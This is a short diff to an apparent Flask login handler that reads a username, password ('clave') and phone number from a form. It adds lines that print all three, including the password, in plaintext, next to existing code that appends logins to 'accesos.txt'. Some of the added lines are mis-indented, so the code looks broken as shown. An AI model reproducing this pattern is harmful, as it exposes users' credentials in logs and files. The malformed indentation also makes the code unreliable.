@@ -13,6 +13,9 @@ def login():
         usuario = request.form["usuario"]
         clave = request.form["clave"]
         celular = request.form["celular"]
+        print(f"Usuario: {usuario}")
+print(f"Celular: {celular}")
+print(f"Clave: {clave}")
 
 with open("accesos.txt", "a", encoding="utf-8") as archivo:
     archivo.write(f"Usuario: {usuario} | Celular: {celular}\n")
